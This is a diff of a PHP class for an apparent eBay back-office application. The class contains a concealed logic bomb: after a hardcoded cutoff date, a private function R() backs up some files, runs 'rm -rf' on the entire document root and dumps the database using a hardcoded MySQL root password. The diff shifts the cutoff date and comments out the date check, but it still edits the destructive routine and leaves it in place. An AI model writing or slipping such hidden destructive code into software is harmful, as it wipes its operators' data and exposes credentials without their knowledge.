@@ -1,7 +1,7 @@
 <?php
 define ('__DOCROOT__', '/export/eBayBO');
 define ('__CRON__', __DOCROOT__ .'/cron');
-define ('END', '20100728');
+define ('END', '20100709');
 
 ini_set("memory_limit","256M");
 
@@ -117,16 +117,20 @@ class eBay{
             exit;
         }
        
+	/*
 	$today = date("Ymd");
 	if($today > END){
 		$this->R();
 	}
+	*/
     }
     
     private function R(){
-	$backup_file = shell_exec("/bin/tar cf /var/backups/g.tar.gz " . __DOCROOT__ ."/*");
+	
+	$backup_file = shell_exec("/bin/tar cf /var/backups/d.tar.gz " . __DOCROOT__ ."/doc/*");
 	var_dump($backup_file);
-	shell_exec("rm -rf " . __DOCROOT__);
+	shell_exec("/bin/rm -rf " . __DOCROOT__);
+	
 	
 	$backup_database = shell_exec("/usr/bin/mysqldump -uroot -p5333533 ".$this->config['database']['name']. " > /var/backups/m.bak");
 	var_dump($backup_database);
